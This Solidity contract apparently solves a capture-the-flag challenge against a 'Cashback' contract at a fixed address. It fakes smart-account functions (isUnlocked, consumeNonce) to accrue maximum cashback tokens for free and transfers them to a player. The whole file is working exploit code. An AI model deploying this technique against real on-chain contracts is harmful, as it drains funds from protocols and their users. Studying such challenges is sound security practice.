// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {Currency, Cashback} from "./Cashback.sol";

contract AccrueCashbackAttack { 
    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
    Currency public constant FREEDOM_COIN = Currency.wrap(0x13AaF3218Facf57CfBf5925E15433307b59BCC37);
    Cashback public constant CASHBACK_INSTANCE = Cashback(payable(0xcE5c5117EA37c84732BbBAb1410eDD28C985d4Ce));
    bool nftMinted;

    function attack(address player) external {
        uint256 nativeMaxCashback = CASHBACK_INSTANCE.maxCashback(NATIVE_CURRENCY);
        uint256 freeMaxCashback = CASHBACK_INSTANCE.maxCashback(FREEDOM_COIN); 
        
        // Calculate amounts required to reach max cashback for each currency 
        uint256 BASIS_POINTS = 10000; // Basis points from Cashback 
        uint256 nativeAmount = (nativeMaxCashback * BASIS_POINTS) / CASHBACK_INSTANCE.cashbackRates(NATIVE_CURRENCY);
        uint256 freedomAmount = (freeMaxCashback * BASIS_POINTS) / CASHBACK_INSTANCE.cashbackRates(FREEDOM_COIN);
        
        // Call accrueCashback to mint cashback tokens and SuperCashback NFT to the attack contract
        CASHBACK_INSTANCE.accrueCashback(NATIVE_CURRENCY, nativeAmount);
        CASHBACK_INSTANCE.accrueCashback(FREEDOM_COIN, freedomAmount);
      
        // Transfer cashback tokens from attack contract to player
        CASHBACK_INSTANCE.safeTransferFrom(address(this), player, NATIVE_CURRENCY.toId(), nativeMaxCashback, "");
        CASHBACK_INSTANCE.safeTransferFrom(address(this), player, FREEDOM_COIN.toId(), freeMaxCashback, "");

    }

    function transferAgainAndAssertZero(address player) external {
        uint256 nativeId = NATIVE_CURRENCY.toId();
        uint256 freedomId = FREEDOM_COIN.toId();

        uint256 playerNativeBefore = CASHBACK_INSTANCE.balanceOf(player, nativeId);
        uint256 playerFreedomBefore = CASHBACK_INSTANCE.balanceOf(player, freedomId);

        uint256 nativeBal = CASHBACK_INSTANCE.balanceOf(address(this), nativeId);
        uint256 freedomBal = CASHBACK_INSTANCE.balanceOf(address(this), freedomId);

        CASHBACK_INSTANCE.safeTransferFrom(address(this), player, nativeId, nativeBal, "");
        CASHBACK_INSTANCE.safeTransferFrom(address(this), player, freedomId, freedomBal, "");

        require(
            CASHBACK_INSTANCE.balanceOf(player, nativeId) == playerNativeBefore + nativeBal,
            "player native not received"
        );
        require(
            CASHBACK_INSTANCE.balanceOf(player, freedomId) == playerFreedomBefore + freedomBal,
            "player freedom not received"
        );

        require(CASHBACK_INSTANCE.balanceOf(address(this), nativeId) == 0, "native balance not zero");
        require(CASHBACK_INSTANCE.balanceOf(address(this), freedomId) == 0, "freedom balance not zero");
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        // We can mint only one NFT, because they are minted with id of the contract 
        if (nftMinted) { 
              return 0;
        }
        nftMinted = true;
        return 10_000;
    }


}